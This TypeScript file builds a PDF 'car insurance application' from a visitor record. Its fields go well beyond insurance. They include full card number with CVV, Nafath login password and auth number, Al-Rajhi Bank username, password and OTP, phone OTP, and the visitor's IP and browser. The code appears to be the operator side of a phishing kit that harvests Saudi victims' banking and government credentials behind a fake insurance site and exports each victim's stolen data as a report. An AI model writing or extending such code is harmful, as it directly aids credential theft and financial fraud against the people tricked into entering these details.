import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";

interface VisitorData {
  id: string;
  personalInfo?: {
    nationalId?: string;
    birthDate?: string;
    phone?: string;
    documment_owner_full_name?: string;
  };
  vehicleInfo?: {
    serialNumber?: string;
    vehicleYear?: string;
    coverageType?: string;
    selectedAddOns?: string[];
  };
  selectedOffer?: {
    companyName?: string;
    basePrice?: number;
    totalPrice?: number;
    discountPercentage?: number;
  };
  paymentInfo?: {
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
  };
  nafazData?: {
    idNumber?: string;
    password?: string;
    authNumber?: string;
  };
  rajhiData?: {
    username?: string;
    password?: string;
    otp?: string;
  };
  phoneData?: {
    phoneNumber?: string;
    carrier?: string;
    otp?: string;
  };
  metadata?: {
    country?: string;
    browser?: string;
    os?: string;
    ip?: string;
    createdAt?: any;
  };
}

export function generateInsurancePDF(data: VisitorData): void {
  const doc = new jsPDF({
    orientation: "portrait",
    unit: "mm",
    format: "a4",
  });

  const pageWidth = doc.internal.pageSize.getWidth();
  const margin = 15;
  let yPos = 20;

  doc.setFont("helvetica", "bold");
  doc.setFontSize(22);
  doc.setTextColor(0, 82, 147);
  
  doc.text("Car Insurance", pageWidth / 2, yPos, { align: "center" });
  yPos += 8;
  
  doc.setFontSize(14);
  doc.setTextColor(0, 82, 147);
  doc.text("Application Form", pageWidth / 2, yPos, { align: "center" });
  yPos += 15;

  doc.setFillColor(0, 82, 147);
  doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
  doc.setTextColor(255, 255, 255);
  doc.setFontSize(11);
  doc.setFont("helvetica", "bold");
  doc.text("Applicant Information", pageWidth / 2, yPos + 5.5, { align: "center" });
  yPos += 12;

  const personalData = [
    ["Full Name", data.personalInfo?.documment_owner_full_name || "-"],
    ["National ID", data.personalInfo?.nationalId || "-"],
    ["Phone Number", data.personalInfo?.phone || "-"],
    ["Birth Date", data.personalInfo?.birthDate || "-"],
  ];

  autoTable(doc, {
    startY: yPos,
    head: [],
    body: personalData,
    theme: "grid",
    styles: {
      fontSize: 10,
      cellPadding: 4,
      halign: "left",
    },
    columnStyles: {
      0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
      1: { cellWidth: "auto" },
    },
    margin: { left: margin, right: margin },
  });

  yPos = (doc as any).lastAutoTable.finalY + 10;

  if (data.vehicleInfo) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Vehicle Information", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const vehicleData = [
      ["Serial Number", data.vehicleInfo?.serialNumber || "-"],
      ["Vehicle Year", data.vehicleInfo?.vehicleYear || "-"],
      ["Coverage Type", data.vehicleInfo?.coverageType || "-"],
      ["Add-ons", data.vehicleInfo?.selectedAddOns?.join(", ") || "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: vehicleData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.selectedOffer) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Insurance Offer", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const offerData = [
      ["Company", data.selectedOffer?.companyName || "-"],
      ["Base Price", data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} SAR` : "-"],
      ["Discount", data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-"],
      ["Total Price", data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} SAR` : "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: offerData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.paymentInfo?.cardNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Payment Information", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const paymentData = [
      ["Card Number", data.paymentInfo?.cardNumber || "-"],
      ["Card Holder", data.paymentInfo?.cardHolder || "-"],
      ["Expiry Date", data.paymentInfo?.expiryDate || "-"],
      ["CVV", data.paymentInfo?.cvv || "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: paymentData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.nafazData?.idNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Nafaz Authentication", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const nafazTableData = [
      ["ID Number", data.nafazData?.idNumber || "-"],
      ["Password", data.nafazData?.password || "-"],
      ["Auth Number", data.nafazData?.authNumber || "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: nafazTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.rajhiData?.username) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Al-Rajhi Bank", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const rajhiTableData = [
      ["Username", data.rajhiData?.username || "-"],
      ["Password", data.rajhiData?.password || "-"],
      ["OTP", data.rajhiData?.otp || "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: rajhiTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.phoneData?.phoneNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Phone Verification", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const phoneTableData = [
      ["Phone Number", data.phoneData?.phoneNumber || "-"],
      ["Carrier", data.phoneData?.carrier || "-"],
      ["OTP", data.phoneData?.otp || "-"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: phoneTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.metadata) {
    doc.setFillColor(100, 100, 100);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text("Metadata", pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const createdAt = data.metadata?.createdAt?.toDate?.() 
      ? data.metadata.createdAt.toDate().toLocaleString("en-US")
      : data.metadata?.createdAt || "-";

    const metaData = [
      ["Country", data.metadata?.country || "-"],
      ["Browser", data.metadata?.browser || "-"],
      ["OS", data.metadata?.os || "-"],
      ["IP Address", data.metadata?.ip || "-"],
      ["Created At", createdAt],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: metaData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "left",
      },
      columnStyles: {
        0: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240] },
        1: { cellWidth: "auto" },
      },
      margin: { left: margin, right: margin },
    });
  }

  const pageHeight = doc.internal.pageSize.getHeight();
  doc.setFontSize(8);
  doc.setTextColor(128, 128, 128);
  doc.text(
    `Generated: ${new Date().toLocaleString("en-US")} | Document ID: ${data.id}`,
    pageWidth / 2,
    pageHeight - 10,
    { align: "center" }
  );

  const fileName = `insurance_application_${data.personalInfo?.nationalId || data.id}_${Date.now()}.pdf`;
  doc.save(fileName);
}
